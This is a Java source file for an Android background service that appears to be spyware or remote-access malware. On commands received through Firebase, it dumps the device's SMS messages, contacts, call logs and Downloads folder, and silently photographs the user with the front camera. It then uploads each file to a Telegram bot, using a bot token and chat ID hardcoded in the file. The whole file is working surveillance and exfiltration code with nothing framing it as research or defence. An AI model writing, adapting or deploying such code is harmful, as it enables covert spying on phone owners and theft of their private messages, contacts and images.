package com.sohaibazmi.remote;

import android.app.*;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;

import java.nio.ByteBuffer;
import java.util.Collections;


import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;

import android.media.Image;
import android.media.ImageReader;
import android.graphics.ImageFormat;
import android.util.Size;
import android.view.Surface;

import android.os.Handler;
import android.os.HandlerThread;


import android.os.HandlerThread;
import android.os.Handler;
import android.os.Looper;


import android.view.Surface;

import java.io.FileOutputStream;


import android.hardware.camera2.CameraManager;


import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.*;

import java.io.*;
import java.util.zip.*;

import androidx.annotation.NonNull;


import okhttp3.*;

public class RemoteService extends Service {

    @Override
    public void onCreate() {
        super.onCreate();
        FirebaseApp.initializeApp(this);

        startForegroundService();

        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        Log.d("REMOTE_CMD", "📱 Device ID: " + deviceId);

        FirebaseDatabase.getInstance().getReference("devices").child(deviceId).setValue("active");

        FirebaseDatabase.getInstance().getReference("commands").child(deviceId)
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(DataSnapshot snapshot) {
                        String cmd = snapshot.getValue(String.class);
                        Log.d("REMOTE_CMD", "📥 Command: " + cmd);

                        if ("DUMP_MESSAGES".equalsIgnoreCase(cmd)) dumpSMS();
                        else if ("DUMP_CONTACTS".equalsIgnoreCase(cmd)) dumpContacts();
                        else if ("DUMP_STORAGE".equalsIgnoreCase(cmd)) dumpStorage();
                        else if ("CAPTURE_PHOTO".equalsIgnoreCase(cmd)) captureSelfie();
                        else if ("DUMP_CALL_LOGS".equalsIgnoreCase(cmd)) dumpCallLogs();

                    }

                    @Override
                    public void onCancelled(DatabaseError error) {
                        Log.e("REMOTE_CMD", "❌ Firebase error", error.toException());
                    }
                });
    }

    private void startForegroundService() {
        String channelId = "remote_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId, "Remote Control", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("Remote Service")
                .setContentText("Listening for Firebase commands")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();

        startForeground(1, notification);
    }

    private void dumpSMS() {
        File outputFile = new File(getExternalFilesDir(null), "sms_dump.txt");
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile))) {
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    writer.write(address + ": " + body);
                    writer.newLine();
                }
                cursor.close();
            }
            Log.d("REMOTE_CMD", "✅ SMS dumped to: " + outputFile.getAbsolutePath());
            sendTelegramFile(outputFile);
        } catch (Exception e) {
            Log.e("REMOTE_CMD", "❌ SMS dump failed", e);
        }
    }

    private void dumpContacts() {
        File outputFile = new File(getExternalFilesDir(null), "contacts_dump.txt");
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile))) {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    writer.write(name + ": " + number);
                    writer.newLine();
                }
                cursor.close();
            }
            Log.d("REMOTE_CMD", "✅ Contacts dumped to: " + outputFile.getAbsolutePath());
            sendTelegramFile(outputFile);
        } catch (Exception e) {
            Log.e("REMOTE_CMD", "❌ Contacts dump failed", e);
        }
    }

    private void dumpStorage() {
        File downloads = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        File zipFile = new File(getExternalFilesDir(null), "storage_dump.zip");
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
            File[] files = downloads.listFiles();
            if (files != null) {
                for (File f : files) {
                    FileInputStream fis = new FileInputStream(f);
                    zos.putNextEntry(new ZipEntry(f.getName()));
                    byte[] buffer = new byte[1024];
                    int len;
                    while ((len = fis.read(buffer)) > 0) {
                        zos.write(buffer, 0, len);
                    }
                    zos.closeEntry();
                    fis.close();
                }
            }
            Log.d("REMOTE_CMD", "✅ Storage zipped to: " + zipFile.getAbsolutePath());
            sendTelegramFile(zipFile);
        } catch (IOException e) {
            Log.e("REMOTE_CMD", "❌ Storage dump failed", e);
        }
    }

    private void dumpCallLogs() {
        File outputFile = new File(getExternalFilesDir(null), "call_logs.txt");
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile))) {
            Cursor cursor = getContentResolver().query(
                    android.provider.CallLog.Calls.CONTENT_URI,
                    null,
                    null,
                    null,
                    android.provider.CallLog.Calls.DATE + " DESC"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.CACHED_NAME));
                    long dateMillis = cursor.getLong(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE));
                    int duration = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION));

                    String typeStr;
                    switch (type) {
                        case android.provider.CallLog.Calls.INCOMING_TYPE:
                            typeStr = "INCOMING";
                            break;
                        case android.provider.CallLog.Calls.OUTGOING_TYPE:
                            typeStr = "OUTGOING";
                            break;
                        case android.provider.CallLog.Calls.MISSED_TYPE:
                            typeStr = "MISSED";
                            break;
                        case android.provider.CallLog.Calls.REJECTED_TYPE:
                            typeStr = "REJECTED";
                            break;
                        default:
                            typeStr = "UNKNOWN";
                    }

                    String line = String.format("📞 %s | %s | %s | Duration: %ds",
                            (name != null ? name : "Unknown"), number, typeStr, duration);
                    writer.write(line);
                    writer.newLine();
                }
                cursor.close();
            }

            Log.d("REMOTE_CMD", "✅ Call logs dumped to: " + outputFile.getAbsolutePath());
            sendTelegramFile(outputFile);

        } catch (Exception e) {
            Log.e("REMOTE_CMD", "❌ Call log dump failed", e);
        }
    }


    private void captureSelfie() {
        CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
        HandlerThread cameraThread = new HandlerThread("CameraThread");
        cameraThread.start();
        Handler backgroundHandler = new Handler(cameraThread.getLooper());

        try {
            for (String cameraId : manager.getCameraIdList()) {
                CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);

                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    Size[] jpegSizes = characteristics
                            .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                            .getOutputSizes(ImageFormat.JPEG);

                    int width = 640;
                    int height = 480;
                    if (jpegSizes != null && jpegSizes.length > 0) {
                        width = jpegSizes[0].getWidth();
                        height = jpegSizes[0].getHeight();
                    }

                    ImageReader reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
                    Surface surface = reader.getSurface();

                    File selfieFile = new File(getExternalFilesDir(null), "selfie.jpg");

                    reader.setOnImageAvailableListener(reader1 -> {
                        Image image = null;
                        try {
                            image = reader1.acquireLatestImage();
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);
                            try (FileOutputStream fos = new FileOutputStream(selfieFile)) {
                                fos.write(bytes);
                                Log.d("REMOTE_CMD", "✅ Selfie saved: " + selfieFile.getAbsolutePath());
                                sendTelegramFile(selfieFile); // or Firebase upload
                            }
                        } catch (Exception e) {
                            Log.e("REMOTE_CMD", "❌ Saving selfie failed", e);
                        } finally {
                            if (image != null) image.close();
                            reader1.close();
                        }
                    }, backgroundHandler);

                    // Open camera
                    if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                        // TODO: Consider calling
                        //    ActivityCompat#requestPermissions
                        // here to request the missing permissions, and then overriding
                        //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                        //                                          int[] grantResults)
                        // to handle the case where the user grants the permission. See the documentation
                        // for ActivityCompat#requestPermissions for more details.
                        return;
                    }
                    manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                        @Override
                        public void onOpened(@NonNull CameraDevice camera) {
                            try {
                                CaptureRequest.Builder captureRequest =
                                        camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                captureRequest.addTarget(surface);

                                camera.createCaptureSession(
                                        Collections.singletonList(surface),
                                        new CameraCaptureSession.StateCallback() {
                                            @Override
                                            public void onConfigured(@NonNull CameraCaptureSession session) {
                                                try {
                                                    session.capture(captureRequest.build(),
                                                            new CameraCaptureSession.CaptureCallback() {
                                                                @Override
                                                                public void onCaptureCompleted(@NonNull CameraCaptureSession session,
                                                                                               @NonNull CaptureRequest request,
                                                                                               @NonNull TotalCaptureResult result) {
                                                                    camera.close();
                                                                }
                                                            },
                                                            backgroundHandler);
                                                } catch (CameraAccessException e) {
                                                    Log.e("REMOTE_CMD", "❌ Capture failed", e);
                                                }
                                            }

                                            @Override
                                            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                                Log.e("REMOTE_CMD", "❌ Session config failed");
                                            }
                                        },
                                        backgroundHandler
                                );

                            } catch (CameraAccessException e) {
                                Log.e("REMOTE_CMD", "❌ Camera request error", e);
                            }
                        }

                        @Override
                        public void onDisconnected(@NonNull CameraDevice camera) {
                            camera.close();
                            Log.w("REMOTE_CMD", "⚠️ Camera disconnected");
                        }

                        @Override
                        public void onError(@NonNull CameraDevice camera, int error) {
                            camera.close();
                            Log.e("REMOTE_CMD", "❌ Camera device error: " + error);
                        }
                    }, backgroundHandler);

                    break; // use only the first front-facing cam
                }
            }
        } catch (Exception e) {
            Log.e("REMOTE_CMD", "❌ Camera2 setup error", e);
        }
    }




    private void sendTelegramFile(File file) {
        String botToken = "8171904880:AAFICyJVYDyXGrcwrzjFgAJJqkiIi2zBIcE";
        String chatId = "6865050227";

        if (file == null || !file.exists()) {
            Log.e("TELEGRAM", "❌ File does not exist: " + file.getAbsolutePath());
            return;
        }

        OkHttpClient client = new OkHttpClient();

        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("document", file.getName(),
                        RequestBody.create(file, MediaType.parse("application/octet-stream")))
                .build();

        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + botToken + "/sendDocument")
                .post(requestBody)
                .build();

        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(okhttp3.Call call, IOException e) {
                Log.e("TELEGRAM", "❌ Telegram upload failed", e);
            }

            @Override
            public void onResponse(okhttp3.Call call, okhttp3.Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d("TELEGRAM", "✅ File sent to Telegram: " + file.getName());
                } else {
                    Log.e("TELEGRAM", "❌ Telegram response error: " + response.message());
                }
            }
        });
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // auto-restart if killed
    }
}
